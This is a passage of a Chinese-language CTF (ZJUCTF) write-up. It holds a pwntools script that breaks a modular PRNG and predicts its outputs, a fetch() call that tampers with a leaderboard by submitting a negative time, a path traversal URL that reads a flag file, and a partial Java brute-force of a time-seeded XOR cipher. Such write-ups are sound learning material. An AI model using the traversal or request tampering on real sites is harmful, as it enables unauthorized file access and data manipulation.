<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>        <span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>
<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>        <span class="c1"># 1. 解决 PoW</span>
<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>        <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;sha256(XXXX + &#39;</span><span class="p">)</span>
<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>        <span class="n">suffix</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>        <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;) == &#39;</span><span class="p">)</span>
<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>        <span class="n">target_hash</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>        <span class="n">pow_solution</span> <span class="o">=</span> <span class="n">solve_pow</span><span class="p">(</span><span class="n">suffix</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">)</span>
<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">pow_solution</span><span class="p">:</span>
<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>            <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&quot;PoW 无解&quot;</span><span class="p">)</span>
<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>            <span class="k">return</span>
<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>        <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Give me XXXX:&#39;</span><span class="p">,</span> <span class="n">pow_solution</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>
<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>        <span class="c1"># 2. 获取泄露的数字</span>
<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a>        <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Level: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a>        <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a>        <span class="n">leaked_str</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a>        <span class="n">o</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">leaked_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)]</span>
<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a>        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;泄露的数字: </span><span class="si">{</span><span class="n">o</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a>
<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a>        <span class="c1"># 3. 恢复参数 (最终鲁棒版)</span>
<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a>        <span class="c1"># 理论上PRNG为二阶，我们将用所有数据点来恢复p</span>
<a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a>        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;坚信模型为二阶，使用所有数据点恢复p...&quot;</span><span class="p">)</span>
<a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a>
<a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a>        <span class="c1"># o_{n+2} = C1*o_{n+1} + C0*o_n</span>
<a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a>        <span class="c1"># 我们可以建立4个方程:</span>
<a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a>        <span class="c1"># eq0: o_2 = C1*o_1 + C0*o_0</span>
<a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a>        <span class="c1"># eq1: o_3 = C1*o_2 + C0*o_1</span>
<a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a>        <span class="c1"># eq2: o_4 = C1*o_3 + C0*o_2</span>
<a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a>        <span class="c1"># eq3: o_5 = C1*o_4 + C0*o_3</span>
<a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a>
<a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a>        <span class="c1"># 从任意两个方程对中消去C0和C1，都能得到一个p的倍数</span>
<a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a>        <span class="c1"># (o_i*o_{j+1} - o_{i+1}*o_j)*C1 = o_{i+2}*o_j - o_{i+1}*o_{i+1}</span>
<a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a>        <span class="c1"># (o_i*o_{j+1} - o_{i+1}*o_j)*C0 = o_{i+1}*o_{j+2} - o_{i+2}*o_{j+1}</span>
<a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a>
<a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a>        <span class="c1"># 我们需要找到两个非零的p的倍数来求gcd</span>
<a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a>        <span class="n">p_multiples</span> <span class="o">=</span> <span class="p">[]</span>
<a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
<a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a>            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
<a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a>                <span class="c1"># 解方程组:</span>
<a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a>                <span class="c1"># o_{i+2} = C1*o_{i+1} + C0*o_i</span>
<a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a>                <span class="c1"># o_{j+2} = C1*o_{j+1} + C0*o_j</span>
<a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a>
<a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a>                <span class="c1"># 使用克莱姆法则</span>
<a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a>                <span class="n">D</span> <span class="o">=</span> <span class="n">o</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">o</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a>                <span class="k">if</span> <span class="n">D</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">continue</span>
<a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a>
<a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a>                <span class="n">N1</span> <span class="o">=</span> <span class="n">o</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">o</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
<a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a>                <span class="n">N0</span> <span class="o">=</span> <span class="n">o</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">o</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-2-73" name="__codelineno-2-73" href="#__codelineno-2-73"></a>
<a id="__codelineno-2-74" name="__codelineno-2-74" href="#__codelineno-2-74"></a>                <span class="c1"># D*C1 = N1 (mod p), D*C0 = N0 (mod p)</span>
<a id="__codelineno-2-75" name="__codelineno-2-75" href="#__codelineno-2-75"></a>                <span class="c1"># 将其代入另一个未使用的方程 k</span>
<a id="__codelineno-2-76" name="__codelineno-2-76" href="#__codelineno-2-76"></a>                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
<a id="__codelineno-2-77" name="__codelineno-2-77" href="#__codelineno-2-77"></a>                    <span class="k">if</span> <span class="n">k</span> <span class="o">==</span> <span class="n">i</span> <span class="ow">or</span> <span class="n">k</span> <span class="o">==</span> <span class="n">j</span><span class="p">:</span> <span class="k">continue</span>
<a id="__codelineno-2-78" name="__codelineno-2-78" href="#__codelineno-2-78"></a>                    <span class="c1"># 验证: D*o_{k+2} = N1*o_{k+1} + N0*o_k (mod p)</span>
<a id="__codelineno-2-79" name="__codelineno-2-79" href="#__codelineno-2-79"></a>                    <span class="n">val</span> <span class="o">=</span> <span class="n">D</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">N1</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">N0</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="n">k</span><span class="p">])</span>
<a id="__codelineno-2-80" name="__codelineno-2-80" href="#__codelineno-2-80"></a>                    <span class="k">if</span> <span class="n">val</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
<a id="__codelineno-2-81" name="__codelineno-2-81" href="#__codelineno-2-81"></a>                        <span class="n">p_multiples</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
<a id="__codelineno-2-82" name="__codelineno-2-82" href="#__codelineno-2-82"></a>
<a id="__codelineno-2-83" name="__codelineno-2-83" href="#__codelineno-2-83"></a>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">p_multiples</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
<a id="__codelineno-2-84" name="__codelineno-2-84" href="#__codelineno-2-84"></a>            <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&quot;无法找到足够的p的倍数，题目可能存在其他陷阱&quot;</span><span class="p">)</span>
<a id="__codelineno-2-85" name="__codelineno-2-85" href="#__codelineno-2-85"></a>            <span class="k">return</span>
<a id="__codelineno-2-86" name="__codelineno-2-86" href="#__codelineno-2-86"></a>
<a id="__codelineno-2-87" name="__codelineno-2-87" href="#__codelineno-2-87"></a>        <span class="n">p</span> <span class="o">=</span> <span class="n">p_multiples</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-2-88" name="__codelineno-2-88" href="#__codelineno-2-88"></a>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">p_multiples</span><span class="p">)):</span>
<a id="__codelineno-2-89" name="__codelineno-2-89" href="#__codelineno-2-89"></a>            <span class="n">p</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p_multiples</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<a id="__codelineno-2-90" name="__codelineno-2-90" href="#__codelineno-2-90"></a>
<a id="__codelineno-2-91" name="__codelineno-2-91" href="#__codelineno-2-91"></a>        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;恢复出素数 p: </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-92" name="__codelineno-2-92" href="#__codelineno-2-92"></a>
<a id="__codelineno-2-93" name="__codelineno-2-93" href="#__codelineno-2-93"></a>        <span class="c1"># 4. 求解二阶系数</span>
<a id="__codelineno-2-94" name="__codelineno-2-94" href="#__codelineno-2-94"></a>        <span class="c1"># 使用最早的两个方程</span>
<a id="__codelineno-2-95" name="__codelineno-2-95" href="#__codelineno-2-95"></a>        <span class="n">det</span> <span class="o">=</span> <span class="n">o</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">o</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<a id="__codelineno-2-96" name="__codelineno-2-96" href="#__codelineno-2-96"></a>        <span class="n">det_inv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">det</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
<a id="__codelineno-2-97" name="__codelineno-2-97" href="#__codelineno-2-97"></a>        <span class="n">C1</span> <span class="o">=</span> <span class="p">(</span><span class="n">det_inv</span> <span class="o">*</span> <span class="p">(</span><span class="n">o</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">o</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="o">%</span> <span class="n">p</span>
<a id="__codelineno-2-98" name="__codelineno-2-98" href="#__codelineno-2-98"></a>        <span class="n">C0</span> <span class="o">=</span> <span class="p">(</span><span class="n">det_inv</span> <span class="o">*</span> <span class="p">(</span><span class="n">o</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">o</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">o</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">%</span> <span class="n">p</span>
<a id="__codelineno-2-99" name="__codelineno-2-99" href="#__codelineno-2-99"></a>        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;系数: C1=</span><span class="si">{</span><span class="n">C1</span><span class="si">}</span><span class="s2">, C0=</span><span class="si">{</span><span class="n">C0</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-100" name="__codelineno-2-100" href="#__codelineno-2-100"></a>
<a id="__codelineno-2-101" name="__codelineno-2-101" href="#__codelineno-2-101"></a>        <span class="c1"># 5. 预测完整序列</span>
<a id="__codelineno-2-102" name="__codelineno-2-102" href="#__codelineno-2-102"></a>        <span class="n">output</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
<a id="__codelineno-2-103" name="__codelineno-2-103" href="#__codelineno-2-103"></a>        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">:</span>
<a id="__codelineno-2-104" name="__codelineno-2-104" href="#__codelineno-2-104"></a>            <span class="n">next_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">C1</span> <span class="o">*</span> <span class="n">output</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">C0</span> <span class="o">*</span> <span class="n">output</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span> <span class="o">%</span> <span class="n">p</span>
<a id="__codelineno-2-105" name="__codelineno-2-105" href="#__codelineno-2-105"></a>            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">next_val</span><span class="p">)</span>
<a id="__codelineno-2-106" name="__codelineno-2-106" href="#__codelineno-2-106"></a>        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;预测的完整序列已生成&quot;</span><span class="p">)</span>
<a id="__codelineno-2-107" name="__codelineno-2-107" href="#__codelineno-2-107"></a>
<a id="__codelineno-2-108" name="__codelineno-2-108" href="#__codelineno-2-108"></a>        <span class="c1"># 6. 提交答案</span>
<a id="__codelineno-2-109" name="__codelineno-2-109" href="#__codelineno-2-109"></a>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
<a id="__codelineno-2-110" name="__codelineno-2-110" href="#__codelineno-2-110"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;guess: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-2-111" name="__codelineno-2-111" href="#__codelineno-2-111"></a>            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Sent guess </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="mi">20</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-112" name="__codelineno-2-112" href="#__codelineno-2-112"></a>
<a id="__codelineno-2-113" name="__codelineno-2-113" href="#__codelineno-2-113"></a>        <span class="n">final_response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
<a id="__codelineno-2-114" name="__codelineno-2-114" href="#__codelineno-2-114"></a>        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;成功! 服务器响应: </span><span class="se">\n</span><span class="si">{</span><span class="n">final_response</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-115" name="__codelineno-2-115" href="#__codelineno-2-115"></a>
<a id="__codelineno-2-116" name="__codelineno-2-116" href="#__codelineno-2-116"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
<a id="__codelineno-2-117" name="__codelineno-2-117" href="#__codelineno-2-117"></a>        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;脚本执行出错: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-118" name="__codelineno-2-118" href="#__codelineno-2-118"></a>    <span class="k">finally</span><span class="p">:</span>
<a id="__codelineno-2-119" name="__codelineno-2-119" href="#__codelineno-2-119"></a>        <span class="k">if</span> <span class="s1">&#39;conn&#39;</span> <span class="ow">in</span> <span class="nb">locals</span><span class="p">()</span> <span class="ow">and</span> <span class="n">conn</span><span class="o">.</span><span class="n">connected</span><span class="p">():</span>
<a id="__codelineno-2-120" name="__codelineno-2-120" href="#__codelineno-2-120"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<a id="__codelineno-2-121" name="__codelineno-2-121" href="#__codelineno-2-121"></a>
<a id="__codelineno-2-122" name="__codelineno-2-122" href="#__codelineno-2-122"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
<a id="__codelineno-2-123" name="__codelineno-2-123" href="#__codelineno-2-123"></a>    <span class="n">solve</span><span class="p">()</span>
<a id="__codelineno-2-124" name="__codelineno-2-124" href="#__codelineno-2-124"></a><span class="c1">#ZJUCTF{Qu@terni0n_1$_jvs7_mA7rIx}</span>
</code></pre></div></p>
<h2 id="web">web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
<h3 id="_1">一觉醒来全世界计算能力下降一万倍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<p>在调试台里面用complate什么什么的，叫什么忘了用来完成比赛的，这样可以0.00秒完成，但是还是不如AAA挂哥快，我勒个，看来只能给他负数的时间了，于是用传api的方式传一个负数的时间上去，脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>fetch(&#39;/api/submit&#39;, {
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    method: &#39;POST&#39;,
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    headers: {
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>        &#39;Content-Type&#39;: &#39;application/json&#39;
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    },
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    body: JSON.stringify({
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>        username: &quot;111&quot;,  // &lt;-- 把这里换成你的名字
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>        elapsed_time: -1         // &lt;-- 我们将时间设置为负数
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    })
<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>}).then(response =&gt; response.json()).then(data =&gt; {
<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>    console.log(&quot;服务器响应:&quot;, data);
<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>    // 提交后可以手动刷新一下排行榜
<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>    // location.reload(); 
<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>});
</code></pre></div></p>
<h3 id="linux">你说你不懂 Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h3>
<p>AI神力，把html发给AI，AIN把梭，最后告诉我访问这个
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://127.0.0.1:65358/index.php?file=../../a.log/../FLAG.TXT.
</code></pre></div>
就可以绕过</p>
<h2 id="rev">rev<a class="headerlink" href="#rev" title="Permanent link">&para;</a></h2>
<h3 id="hello-reverse">hello-reverse<a class="headerlink" href="#hello-reverse" title="Permanent link">&para;</a></h3>
<p>异架构，想着签到题不会这么难，于是直接shitf+F12找字符串，定位到关键地方，果然是明文存储，但是发现tmd一直都交不对，还有不可打印字符，后续发现是emoji，IDA的提取的时候自动把小端序改了回来，但是emoji不能改端序，导致出了不可打印字符，换成另一个端序打开就好了，是个喇叭的emoji</p>
<h2 id="hej">hej<a class="headerlink" href="#hej" title="Permanent link">&para;</a></h2>
<p>java，用<img alt="alt text" src="../pic/image5.png" />
jadx-jui打开长这样，是个关于时间做seed，然后用seed生成随机数之后与flag异或，这个利用已知flag前缀为<code>ZJUCTF{</code>来进行异或，验证种子对不对，然后根据提示，时间戳是在比赛期间的，爆破一下就好了,为了适配，用java写的，让AI给我写的
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.charset.StandardCharsets</span><span class="p">;</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Calendar</span><span class="p">;</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Date</span><span class="p">;</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Random</span><span class="p">;</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TimeZone</span><span class="p">;</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1">// 脚本 B: 使用 Unix 时间戳 (秒) 作为种子</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ZJUCTF2025Solver</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">targetString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;r¶5\u0082\u000fb1ô´ò+\u0006»\u0095k®´TnÛ*\u009dØgúþ&gt;c2é´0G\u0013áÊúÁ|\u001c)\u001eîå3¤\bÞþç\n_\u008a\u0010óíÉ\u0013Áçñb7Q&quot;</span><span class="p">;</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">targetBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">targetString</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">ISO_8859_1</span><span class="p">);</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">        </span><span class="n">Calendar</span><span class="w"> </span><span class="n">cal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Calendar</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">TimeZone</span><span class="p">.</span><span class="na">getTimeZone</span><span class="p">(</span><span class="s">&quot;UTC&quot;</span><span class="p">));</span>
